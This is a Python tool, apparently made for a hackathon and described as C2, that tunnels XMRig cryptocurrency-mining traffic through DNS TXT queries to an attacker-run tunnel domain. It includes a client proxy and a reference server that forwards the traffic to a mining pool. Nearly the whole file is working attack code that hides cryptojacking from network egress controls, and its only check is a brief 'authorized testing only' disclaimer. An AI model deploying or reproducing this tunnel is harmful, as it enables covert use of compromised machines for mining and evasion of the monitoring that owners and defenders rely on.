#!/usr/bin/env python3
"""
DNS Tunnel Client for XMRig C2 Communication
Purpose: Tunnel Stratum protocol through DNS queries
Author: OSCP Hackathon 2025
Usage: python3 c2_tunnel.py --pool pool.supportxmr.com --dns 8.8.8.8 --domain tunnel.example.com

WARNING: For authorized testing only!
"""

import socket
import base64
import argparse
import threading
import time
import hashlib
import sys

try:
    import dns.resolver
    import dns.message
    import dns.query
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False
    print("[!] dnspython not installed")
    print("    Install: pip install dnspython")

class DNSTunnelClient:
    """
    DNS Tunnel Client for XMRig
    Encodes mining traffic in DNS queries
    """

    def __init__(self, dns_server, tunnel_domain, pool_host, pool_port=3333):
        self.dns_server = dns_server
        self.tunnel_domain = tunnel_domain
        self.pool_host = pool_host
        self.pool_port = pool_port

        # Session ID for tracking
        self.session_id = self._generate_session_id()

        # Configuration
        self.chunk_size = 50  # DNS label size limit
        self.query_delay = 0.05  # Rate limiting
        self.max_retries = 3

        # Stats
        self.queries_sent = 0
        self.bytes_sent = 0
        self.bytes_received = 0

    def _generate_session_id(self):
        """Generate unique session identifier"""
        data = f"{time.time()}{socket.gethostname()}".encode()
        return hashlib.md5(data).hexdigest()[:8]

    def _encode_data(self, data):
        """
        Encode data for DNS query
        Uses base32 (DNS-safe alphabet)
        """
        if isinstance(data, str):
            data = data.encode()

        # Base32 encode
        encoded = base64.b32encode(data).decode().lower()

        # Remove padding (will restore on decode)
        encoded = encoded.rstrip('=')

        return encoded

    def _decode_data(self, data):
        """Decode data from DNS response"""
        # Add padding back
        padding_needed = (8 - len(data) % 8) % 8
        data += '=' * padding_needed

        try:
            decoded = base64.b32decode(data.upper())
            return decoded
        except Exception as e:
            print(f"[!] Decode error: {e}")
            return b''

    def _chunk_data(self, data):
        """Split data into DNS-safe chunks"""
        encoded = self._encode_data(data)

        chunks = []
        for i in range(0, len(encoded), self.chunk_size):
            chunk = encoded[i:i+self.chunk_size]
            chunks.append(chunk)

        return chunks

    def _send_dns_query(self, data_chunk, sequence, total_chunks, query_type='data'):
        """
        Send DNS query with tunneled data

        Query format:
        <type>.<session>.<seq>.<total>.<data>.<domain>

        Types:
        - init: Initialize session
        - data: Data transfer
        - poll: Poll for response
        - close: Close session
        """

        # Construct query name
        query_name = f"{query_type}.{self.session_id}.{sequence:04d}.{total_chunks:04d}.{data_chunk}.{self.tunnel_domain}"

        # Ensure valid DNS name (max 253 chars)
        if len(query_name) > 253:
            print(f"[!] Query too long: {len(query_name)} chars")
            return None

        try:
            # Create DNS query
            query = dns.message.make_query(query_name, dns.rdatatype.TXT)

            # Send query
            response = dns.query.udp(query, self.dns_server, timeout=5)

            self.queries_sent += 1

            # Extract response data
            if response.answer:
                for answer in response.answer:
                    for item in answer.items:
                        if item.rdtype == dns.rdatatype.TXT:
                            # TXT record contains encoded response
                            txt_data = b''.join(item.strings).decode()
                            return self._decode_data(txt_data)

            return None

        except dns.exception.Timeout:
            print(f"[!] DNS query timeout")
            return None
        except Exception as e:
            print(f"[!] DNS query error: {e}")
            return None

    def _send_chunked_data(self, data):
        """Send data through DNS tunnel in chunks"""

        # Split into chunks
        chunks = self._chunk_data(data)

        print(f"[→] Sending {len(data)} bytes in {len(chunks)} DNS queries")

        responses = []

        for i, chunk in enumerate(chunks):
            # Rate limiting
            if i > 0:
                time.sleep(self.query_delay)

            # Send chunk with retry
            for attempt in range(self.max_retries):
                response = self._send_dns_query(chunk, i, len(chunks))

                if response:
                    responses.append(response)
                    self.bytes_sent += len(data)
                    break
                elif attempt < self.max_retries - 1:
                    print(f"[!] Retry {attempt + 1}/{self.max_retries}")
                    time.sleep(0.5)

        # Combine responses
        if responses:
            combined_response = b''.join(responses)
            self.bytes_received += len(combined_response)
            return combined_response

        return b''

    def _init_session(self):
        """Initialize DNS tunnel session"""
        print(f"\n[*] Initializing DNS tunnel session")
        print(f"    Session ID: {self.session_id}")
        print(f"    DNS Server: {self.dns_server}")
        print(f"    Tunnel Domain: {self.tunnel_domain}")
        print(f"    Pool: {self.pool_host}:{self.pool_port}")

        # Send init query
        init_data = f"INIT|{self.pool_host}|{self.pool_port}"
        response = self._send_dns_query(
            self._encode_data(init_data),
            0, 1,
            query_type='init'
        )

        if response:
            print(f"[+] Session initialized")
            return True
        else:
            print(f"[!] Session initialization failed")
            return False

    def start_proxy(self, listen_port=3333):
        """
        Start local proxy for XMRig
        XMRig connects to 127.0.0.1:3333
        """

        if not DNS_AVAILABLE:
            print("[!] Cannot start - dnspython not installed")
            sys.exit(1)

        # Initialize session
        if not self._init_session():
            print("[!] Failed to initialize DNS tunnel")
            sys.exit(1)

        # Create listening socket
        proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        proxy_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            proxy_socket.bind(('127.0.0.1', listen_port))
            proxy_socket.listen(5)
        except Exception as e:
            print(f"[!] Failed to bind to port {listen_port}: {e}")
            sys.exit(1)

        print(f"\n[*] DNS Tunnel Proxy listening on 127.0.0.1:{listen_port}")
        print(f"[*] Configure XMRig to connect to: 127.0.0.1:{listen_port}")
        print(f"\n[*] Press Ctrl+C to stop\n")

        try:
            while True:
                # Accept XMRig connection
                client_socket, addr = proxy_socket.accept()
                print(f"\n[+] XMRig connected from {addr[0]}:{addr[1]}")

                # Handle connection in thread
                client_thread = threading.Thread(
                    target=self._handle_client,
                    args=(client_socket,)
                )
                client_thread.daemon = True
                client_thread.start()

        except KeyboardInterrupt:
            print(f"\n\n[*] Stopping DNS tunnel proxy...")
            self._close_session()
            proxy_socket.close()
            self._print_stats()

    def _handle_client(self, client_socket):
        """Handle individual XMRig connection"""

        try:
            while True:
                # Receive data from XMRig
                data = client_socket.recv(4096)

                if not data:
                    print("[!] XMRig disconnected")
                    break

                # Send through DNS tunnel
                response = self._send_chunked_data(data)

                # Send response back to XMRig
                if response:
                    client_socket.sendall(response)

        except socket.error as e:
            print(f"[!] Socket error: {e}")
        except Exception as e:
            print(f"[!] Error handling client: {e}")
        finally:
            client_socket.close()
            print("[*] Client connection closed")

    def _close_session(self):
        """Close DNS tunnel session"""
        print("[*] Closing session...")

        try:
            self._send_dns_query(
                self._encode_data("CLOSE"),
                0, 1,
                query_type='close'
            )
        except:
            pass

    def _print_stats(self):
        """Print tunnel statistics"""
        print("\n" + "=" * 60)
        print(" DNS Tunnel Statistics")
        print("=" * 60)
        print(f"  Session ID:        {self.session_id}")
        print(f"  DNS Queries Sent:  {self.queries_sent}")
        print(f"  Bytes Sent:        {self.bytes_sent:,}")
        print(f"  Bytes Received:    {self.bytes_received:,}")
        print(f"  Efficiency:        {(self.bytes_sent / max(self.queries_sent, 1)):.1f} bytes/query")
        print("=" * 60)

class SimpleDNSTunnelServer:
    """
    Simple DNS tunnel server reference implementation
    (Would run on your controlled DNS server)
    """

    def __init__(self, pool_host, pool_port):
        self.pool_host = pool_host
        self.pool_port = pool_port
        self.sessions = {}

    def handle_query(self, query_name):
        """
        Handle incoming DNS query

        Query format: <type>.<session>.<seq>.<total>.<data>.<domain>
        """

        parts = query_name.split('.')

        if len(parts) < 6:
            return None

        query_type = parts[0]
        session_id = parts[1]
        sequence = int(parts[2])
        total = int(parts[3]
)
        data_chunk = parts[4]

        # Decode data
        decoded = self._decode_data(data_chunk)

        if query_type == 'init':
            # Initialize session
            return self._handle_init(session_id, decoded)
        elif query_type == 'data':
            # Forward to pool
            return self._handle_data(session_id, decoded, sequence, total)
        elif query_type == 'close':
            # Close session
            return self._handle_close(session_id)

        return None

    def _handle_init(self, session_id, data):
        """Handle session initialization"""
        # Parse INIT|pool_host|pool_port
        parts = data.decode().split('|')

        if len(parts) == 3 and parts[0] == 'INIT':
            pool_host = parts[1]
            pool_port = int(parts[2])

            # Create session
            self.sessions[session_id] = {
                'pool_host': pool_host,
                'pool_port': pool_port,
                'chunks': {}
            }

            return self._encode_data(b'OK')

        return None

    def _handle_data(self, session_id, data, sequence, total):
        """Handle data chunk"""

        if session_id not in self.sessions:
            return None

        session = self.sessions[session_id]

        # Store chunk
        session['chunks'][sequence] = data

        # Check if all chunks received
        if len(session['chunks']) == total:
            # Reassemble data
            full_data = b''.join([
                session['chunks'][i] for i in range(total)
            ])

            # Forward to pool
            response = self._forward_to_pool(
                session['pool_host'],
                session['pool_port'],
                full_data
            )

            # Clear chunks
            session['chunks'] = {}

            return self._encode_data(response)

        return None

    def _forward_to_pool(self, pool_host, pool_port, data):
        """Forward data to mining pool"""

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((pool_host, pool_port))

            sock.sendall(data)
            response = sock.recv(4096)

            sock.close()

            return response

        except Exception as e:
            print(f"[!] Pool connection error: {e}")
            return b''

    def _handle_close(self, session_id):
        """Close session"""
        if session_id in self.sessions:
            del self.sessions[session_id]
            return self._encode_data(b'CLOSED')
        return None

    def _encode_data(self, data):
        """Encode for DNS response"""
        return base64.b32encode(data).decode().lower().rstrip('=')

    def _decode_data(self, data):
        """Decode from DNS query"""
        padding = (8 - len(data) % 8) % 8
        return base64.b32decode((data + '=' * padding).upper())

def main():
    parser = argparse.ArgumentParser(
        description='DNS Tunnel Client for XMRig C2',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Basic usage
  python3 c2_tunnel.py --pool pool.supportxmr.com --dns 8.8.8.8 --domain tunnel.example.com

  # Custom local port
  python3 c2_tunnel.py --pool pool.supportxmr.com --dns 8.8.8.8 --domain tunnel.example.com --port 3334

  # With debugging
  python3 c2_tunnel.py --pool pool.supportxmr.com --dns 8.8.8.8 --domain tunnel.example.com --debug

Then configure XMRig:
  {
    "pools": [{
      "url": "127.0.0.1:3333",
      "user": "YOUR_WALLET",
      "pass": "x"
    }]
  }

Note: Requires DNS server configured to handle tunnel domain!
        '''
    )

    parser.add_argument('--pool', required=True,
                        help='Mining pool hostname')
    parser.add_argument('--pool-port', type=int, default=3333,
                        help='Mining pool port (default: 3333)')
    parser.add_argument('--dns', required=True,
                        help='DNS server IP for tunneling')
    parser.add_argument('--domain', required=True,
                        help='Tunnel domain (must be configured on DNS server)')
    parser.add_argument('--port', type=int, default=3333,
                        help='Local proxy port (default: 3333)')
    parser.add_argument('--chunk-size', type=int, default=50,
                        help='DNS chunk size (default: 50)')
    parser.add_argument('--debug', action='store_true',
                        help='Enable debug output')

    args = parser.parse_args()

    # Banner
    print("\n╔" + "═" * 58 + "╗")
    print("║" + " DNS Tunnel Client - XMRig C2 - OSCP Hackathon 2025 ".center(58) + "║")
    print("╚" + "═" * 58 + "╝\n")

    # Check requirements
    if not DNS_AVAILABLE:
        print("[!] ERROR: dnspython not installed")
        print("    Install: pip install dnspython")
        sys.exit(1)

    # Create tunnel client
    client = DNSTunnelClient(
        dns_server=args.dns,
        tunnel_domain=args.domain,
        pool_host=args.pool,
        pool_port=args.pool_port
    )

    if args.chunk_size:
        client.chunk_size = args.chunk_size

    # Start proxy
    try:
        client.start_proxy(listen_port=args.port)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
